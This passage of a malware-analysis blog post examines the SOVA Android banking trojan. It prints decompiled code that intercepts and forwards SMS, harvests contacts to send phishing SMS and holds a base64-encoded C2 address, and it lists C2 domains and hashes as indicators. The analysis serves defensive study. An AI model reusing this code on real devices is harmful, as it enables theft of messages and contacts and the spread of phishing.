                        <span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="n">overlay</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="p">((</span><span class="n">Function0</span><span class="p">)</span><span class="k">new</span> <span class="n">PingTasks</span><span class="p">.</span><span class="n">onPingReceived</span><span class="p">.</span><span class="m">3</span><span class="p">(</span><span class="n">workerService1</span><span class="p">)),</span> <span class="m">0</span><span class="p">,</span> <span class="m">5</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                        <span class="k">return</span><span class="p">;}</span>
 <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"sendsms"</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="nf">sendSMS</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="n">command0</span><span class="p">.</span><span class="nf">getNumber</span><span class="p">(),</span> <span class="n">command0</span><span class="p">.</span><span class="nf">getText</span><span class="p">());</span>
                        <span class="k">return</span><span class="p">;}</span>
 <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"startmute"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="k">this</span><span class="p">.</span><span class="nf">mutePhone</span><span class="p">(</span><span class="n">context0</span><span class="p">);</span>
                                <span class="k">return</span><span class="p">;</span>
                            <span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"stopmute"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="k">this</span><span class="p">.</span><span class="nf">unmutePhone</span><span class="p">(</span><span class="n">context0</span><span class="p">);</span>
                                <span class="k">return</span><span class="p">;</span>
                            <span class="p">}</span>

</code></pre></div></div>
<p>The malware collect the SMS stored in the victim’s device and send it to C2 server. This happens by collecting the body and the address(number) of the SMS message.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">void</span> <span class="nf">onReceive</span><span class="p">(</span><span class="n">Context</span> <span class="n">context0</span><span class="p">,</span> <span class="n">Intent</span> <span class="n">intent0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">SmsMessage</span><span class="p">[]</span> <span class="n">arr_smsMessage</span> <span class="p">=</span> <span class="n">Telephony</span><span class="p">.</span><span class="n">Sms</span><span class="p">.</span><span class="n">Intents</span><span class="p">.</span><span class="nf">getMessagesFromIntent</span><span class="p">(</span><span class="n">intent0</span><span class="p">);</span>
            <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">arr_smsMessage</span><span class="p">,</span> <span class="s">"smsMessages"</span><span class="p">);</span>
            <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">v</span> <span class="p">&gt;=</span> <span class="n">arr_smsMessage</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">SmsMessage</span> <span class="n">smsMessage0</span> <span class="p">=</span> <span class="n">arr_smsMessage</span><span class="p">[</span><span class="n">v</span><span class="p">];</span>
                <span class="p">++</span><span class="n">v</span><span class="p">;</span>
                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s">"content://sms"</span><span class="p">),</span> <span class="s">"parse(\"content://sms\")"</span><span class="p">);</span>
                <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">smsMessage0</span><span class="p">.</span><span class="nf">getMessageBody</span><span class="p">();</span>
                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"message.messageBody"</span><span class="p">);</span>
                <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="n">smsMessage0</span><span class="p">.</span><span class="nf">getOriginatingAddress</span><span class="p">();</span>
                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNull</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">"message.originatingAddress!!"</span><span class="p">);</span>
                <span class="k">new</span> <span class="nf">SendSms</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">s1</span><span class="p">).</span><span class="nf">justExecute</span><span class="p">();</span>
                <span class="n">StringBuilder</span> <span class="n">stringBuilder0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">append</span><span class="p">(</span><span class="s">"Sending SMS Message ("</span><span class="p">);</span>
                <span class="n">String</span> <span class="n">s2</span> <span class="p">=</span> <span class="n">smsMessage0</span><span class="p">.</span><span class="nf">getOriginatingAddress</span><span class="p">();</span>
                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNull</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
                <span class="n">AppKt</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">s2</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">", "</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="n">smsMessage0</span><span class="p">.</span><span class="nf">getMessageBody</span><span class="p">()).</span><span class="nf">append</span><span class="p">(</span><span class="sc">')'</span><span class="p">).</span><span class="nf">toString</span><span class="p">(),</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="nf">abortBroadcast</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>
<p>The malware will start collecting contacts to gain new victims by sending phishing SMS.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"contactssender"</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">HashMap</span> <span class="n">hashMap0</span> <span class="p">=</span> <span class="n">Contacts</span><span class="p">.</span><span class="nf">getContactList</span><span class="p">(</span><span class="n">context0</span><span class="p">);</span>
                        <span class="k">for</span><span class="p">(</span><span class="n">Object</span> <span class="n">object0</span><span class="p">:</span> <span class="n">hashMap0</span><span class="p">.</span><span class="nf">keySet</span><span class="p">())</span> <span class="p">{</span>
                            <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">object0</span><span class="p">;</span>
                            <span class="k">try</span> <span class="p">{</span>
                                <span class="n">Object</span> <span class="n">object1</span> <span class="p">=</span> <span class="n">hashMap0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
                                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNull</span><span class="p">(</span><span class="n">object1</span><span class="p">);</span>
                                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">object1</span><span class="p">,</span> <span class="s">"contacts[i]!!"</span><span class="p">);</span>
                                <span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="nf">sendSMS</span><span class="p">(((</span><span class="n">Context</span><span class="p">)</span><span class="n">workerService1</span><span class="p">),</span> <span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">object1</span><span class="p">),</span> <span class="n">command0</span><span class="p">.</span><span class="nf">getText</span><span class="p">());</span>
                            <span class="p">}</span>
                            <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">return</span><span class="p">;</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"getcontacts"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="n">ContextAccessesExtensionsKt</span><span class="p">.</span><span class="nf">sendImAlive</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="n">preferences0</span><span class="p">,</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">());</span>
                                <span class="k">return</span><span class="p">;</span>
</code></pre></div></div>

<p>The malware creates a loop to collect the contacts by collecting the <code class="language-plaintext highlighter-rouge">id</code>, <code class="language-plaintext highlighter-rouge">display_name</code>, and <code class="language-plaintext highlighter-rouge">number</code> then save this info to <code class="language-plaintext highlighter-rouge">data1</code> to upload this file to C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">class</span> <span class="nc">Contacts</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">HashMap</span> <span class="nf">getContactList</span><span class="p">(</span><span class="n">Context</span> <span class="n">context0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ContentResolver</span> <span class="n">contentResolver0</span> <span class="p">=</span> <span class="n">context0</span><span class="p">.</span><span class="nf">getContentResolver</span><span class="p">();</span>
        <span class="n">Cursor</span> <span class="n">cursor0</span> <span class="p">=</span> <span class="n">contentResolver0</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span><span class="n">ContactsContract</span><span class="p">.</span><span class="n">Contacts</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="n">HashMap</span> <span class="n">hashMap0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="p">();</span>
        <span class="k">if</span><span class="p">((</span><span class="n">cursor0</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="m">0</span> <span class="p">:</span> <span class="n">cursor0</span><span class="p">.</span><span class="nf">getCount</span><span class="p">())</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">while</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
                <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">cursor0</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"_id"</span><span class="p">));</span>
                <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="n">cursor0</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"display_name"</span><span class="p">));</span>
                <span class="k">if</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"has_phone_number"</span><span class="p">))</span> <span class="p">&lt;=</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">continue</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">Cursor</span> <span class="n">cursor1</span> <span class="p">=</span> <span class="n">contentResolver0</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span><span class="n">ContactsContract</span><span class="p">.</span><span class="n">CommonDataKinds</span><span class="p">.</span><span class="n">Phone</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="s">"contact_id = ?"</span><span class="p">,</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="n">s</span><span class="p">},</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">while</span><span class="p">(</span><span class="n">cursor1</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
                    <span class="n">hashMap0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="n">cursor1</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">cursor1</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"data1"</span><span class="p">)));</span>
                <span class="p">}</span>

                <span class="n">cursor1</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="n">cursor0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cursor0</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="n">hashMap0</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>The malware connects to <code class="language-plaintext highlighter-rouge">http://ip-api.com</code> to retrive the IP, location of the victim. If the IP is located in <code class="language-plaintext highlighter-rouge">listCountryToIgnore</code>, the malware will ignore the victim’s device and don’t performe the malicious functions.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="p">{</span>
        <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="s">"aHR0cDovL3NhdGFuZGVtYW50ZW5pbWllbnRvLmNvbQ=="</span><span class="p">,</span> <span class="s">"TDE(\"aHR0cDovL3NhdGFuZGV…W50ZW5pbWllbnRvLmNvbQ==\")"</span><span class="p">);</span>
        <span class="n">ConstKt</span><span class="p">.</span><span class="n">SERVER_ADDRESS</span> <span class="p">=</span> <span class="s">"aHR0cDovL3NhdGFuZGVtYW50ZW5pbWllbnRvLmNvbQ=="</span><span class="p">;</span>
        <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="s">"MQ=="</span><span class="p">,</span> <span class="s">"TDE(\"MQ==\")"</span><span class="p">);</span>
        <span class="n">ConstKt</span><span class="p">.</span><span class="n">ACCESS_VALUE</span> <span class="p">=</span> <span class="s">"MQ=="</span><span class="p">;</span>
        <span class="n">ConstKt</span><span class="p">.</span><span class="n">listCountryToIgnore</span> <span class="p">=</span> <span class="n">CollectionsKt</span><span class="p">.</span><span class="nf">listOf</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"AZ"</span><span class="p">,</span> <span class="s">"AM"</span><span class="p">,</span> <span class="s">"BY"</span><span class="p">,</span> <span class="s">"KZ"</span><span class="p">,</span> <span class="s">"KG"</span><span class="p">,</span> <span class="s">"MD"</span><span class="p">,</span> <span class="s">"RU"</span><span class="p">,</span> <span class="s">"TJ"</span><span class="p">,</span> <span class="s">"UZ"</span><span class="p">,</span> <span class="s">"UA"</span><span class="p">,</span> <span class="s">"ID"</span><span class="p">});</span>
    <span class="p">}</span>

</code></pre></div></div>

<p>We come to the end. There are some other commands such as <code class="language-plaintext highlighter-rouge">delbot</code> to delete the bot from victim’s device, <code class="language-plaintext highlighter-rouge">starthidenpush</code> to hide pushing notification, <code class="language-plaintext highlighter-rouge">delapp</code> to delete apps from the device, <code class="language-plaintext highlighter-rouge">call</code> to call action from the device, <code class="language-plaintext highlighter-rouge">callforward</code> to forward a phone call to the attacker and more commands found in this malware.</p>

<h1 id="dynamic">Dynamic</h1>

<p>After installing the malicious APK and open the APK, the malware will keep asking you for granting the <code class="language-plaintext highlighter-rouge">Accessibility Service</code> to maintain presistance. After granting, the malware will be able to get the permission by itself as if he makes himself home.</p>

<p align="center">
  <img src="/assets/images/MA/sova/9.png" />
</p>
<center><font size="3"> <u>Figure</u>(9): connects to ip-api to get country and IP and more<u></u> </font></center>
<p><br /></p>

<p align="center">
  <img src="/assets/images/MA/sova/10.png" />
</p>
<center><font size="3"> <u>Figure</u>(10): connects to C2 server with param and botid, response from C2 is `ok`<u></u> </font></center>
<p><br /></p>

<h1 id="ioc">IoC</h1>

<table>
  <thead>
    <tr>
      <th style="text-align: left">No.</th>
      <th>Description</th>
      <th>Hash and URLs</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">1</td>
      <td>APK (MD5 )</td>
      <td>74b8956dc35fd8a5eb2f7a5d313e60ca</td>
    </tr>
    <tr>
      <td style="text-align: left">2</td>
      <td>The unpacked dex (MD5)</td>
      <td>f7f7cdf82b7b6c72882a6172213d0aff</td>
    </tr>
    <tr>
      <td style="text-align: left">3</td>
      <td>C2 server</td>
      <td>http://satandemantenimiento.com</td>
    </tr>
    <tr>
      <td style="text-align: left">4</td>
      <td>C2 server</td>
      <td>http://wecrvtbyutrcewwretyntrverfd.xyz</td>
    </tr>
  </tbody>
</table>

<h1 id="article-quote">Article quote</h1>

<blockquote>
  <p>أتهجُرُ دربَ الهُدَى والصَّلاحِ وترحَلُ في مُهلِكاتِ الدُّروب</p>
</blockquote>

<h1 id="ref">REF</h1>

<p><a href="https://www.cleafy.com/cleafy-labs/sova-malware-is-back-and-is-evolving-rapidly">SOVA malware is back and is evolving rapidly</a></p>

<p><a href="https://developer.android.com/">Android Dev</a></p>

<p><a href="https://cryptax.medium.com/reversing-v-alert-covid-19-android-bankbot-8809c7389f13">Unpacking process</a></p>

<p><a href="https://ghoulsec.medium.com/mal-series-20-android-libarm-protect-packer-1dd2c6474870">[Mal Series #20] Android libarm_protect packer</a></p>


        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware-analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-09-01T00:00:00+00:00">September 1, 2022</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Technical+analysis+of+SOVA+android+malware%20https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fsova%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fsova%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fsova%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/malware-analysis/irata/" class="pagination--pager" title="Technical analysis of IRATA android malware
">Previous</a>
    
    
      <a href="/malware-analysis/sharkbot/" class="pagination--pager" title="Technical analysis of SharkBot android malware
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Muhammad Hasan Ali. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-9P532HWLYQ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-9P532HWLYQ');
</script>








  </body>
</html>
